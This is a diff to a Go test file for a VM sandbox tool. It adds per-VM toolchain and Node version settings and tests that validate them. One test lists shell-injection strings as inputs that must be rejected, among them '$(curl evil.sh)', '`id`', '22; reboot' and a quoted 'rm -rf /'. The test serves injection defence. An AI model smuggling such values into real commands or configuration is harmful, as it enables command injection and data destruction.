@@ -192,6 +192,7 @@ func TestEveryPerVMKeyIsAcceptedInAPerVMFile(t *testing.T) {
 		"PORT_MIN": "4000", "PORT_MAX": "5000",
 		"DISTRO": "ubuntu2404", "IMAGE_URL": "https://example.com/x.qcow2",
 		"EXTRA_PACKAGES": "latexmk", "CLAUDE_MODEL": "opus",
+		"TOOLCHAIN": "node", "NODE_VERSION": "22",
 		"GIT_USER_NAME": "Someone", "GIT_USER_EMAIL": "someone@example.com",
 	}
 	for _, key := range PerVMKeys() {
@@ -340,5 +341,76 @@ func TestTheExampleConfigSetsNothingAsShipped(t *testing.T) {
 	}
 	if len(warnings) != 0 {
 		t.Errorf("the shipped example warns: %q", warnings)
+	}
+}
+
+// --- language runtimes -------------------------------------------------------
+
+// The toolchain is a per-VM decision in practice: a document repo wants
+// neither runtime, a JS project wants node pinned. This is the case the
+// feature exists for.
+func TestToolchainAndNodeVersionAreSettablePerVM(t *testing.T) {
+	_, configPath := setup(t)
+	writeConfig(t, configPath, "PTRBOX_TOOLCHAIN=\"node uv\"\n")
+	writeVMConfig(t, "thesis", "PTRBOX_TOOLCHAIN=\"\"\n")
+	writeVMConfig(t, "webapp", "PTRBOX_TOOLCHAIN=node\nPTRBOX_NODE_VERSION=22.11.0\n")
+
+	if got := mustOverlay(t, "thesis").ToolchainList(); got != "" {
+		t.Errorf("thesis toolchain = %q, want none", got)
+	}
+	webapp := mustOverlay(t, "webapp")
+	if got := webapp.ToolchainList(); got != "node" {
+		t.Errorf("webapp toolchain = %q, want node alone", got)
+	}
+	if webapp.NodeVersion != "22.11.0" {
+		t.Errorf("webapp node version = %q, want the pin", webapp.NodeVersion)
+	}
+	// And a sandbox that says nothing still gets both, at LTS.
+	base := mustLoad(t)
+	if got := base.ToolchainList(); got != "node uv" {
+		t.Errorf("default toolchain = %q, want both", got)
+	}
+	if base.NodeVersion != "lts" {
+		t.Errorf("default node version = %q, want lts", base.NodeVersion)
+	}
+}
+
+// Only runtimes 30-toolchain.sh knows how to install. A name nothing installs
+// would become a vm/verify.sh check that can never pass, which is a VM that
+// can never be created and no way to tell why from the message.
+func TestAnUnknownRuntimeIsRefused(t *testing.T) {
+	for _, name := range []string{"python", "rust", "npm", "Node"} {
+		t.Run(name, func(t *testing.T) {
+			setup(t)
+			writeVMConfig(t, "thesis", "PTRBOX_TOOLCHAIN="+name+"\n")
+			overlayErr(t, "thesis", "is not a runtime ptrbox installs")
+		})
+	}
+}
+
+// The node version is interpolated into `nvm install "..."` inside the guest,
+// so the charset is the whole defence. Everything nvm understands passes;
+// nothing that could leave the quotes does.
+func TestNodeVersionRejectsAnythingShellish(t *testing.T) {
+	for _, bad := range []string{
+		"22; reboot", "$(curl evil.sh)", "`id`", "\"; rm -rf /; \"", "-lts", "",
+	} {
+		t.Run(bad, func(t *testing.T) {
+			setup(t)
+			writeVMConfig(t, "thesis", "PTRBOX_NODE_VERSION='"+bad+"'\n")
+			overlayErr(t, "thesis", "PTRBOX_NODE_VERSION")
+		})
+	}
+}
+
+func TestNodeVersionAcceptsWhatNvmUnderstands(t *testing.T) {
+	for _, good := range []string{"lts", "node", "lts/hydrogen", "22", "22.11.0"} {
+		t.Run(good, func(t *testing.T) {
+			setup(t)
+			writeVMConfig(t, "thesis", "PTRBOX_NODE_VERSION="+good+"\n")
+			if got := mustOverlay(t, "thesis").NodeVersion; got != good {
+				t.Errorf("NodeVersion = %q, want %q", got, good)
+			}
+		})
 	}
 }
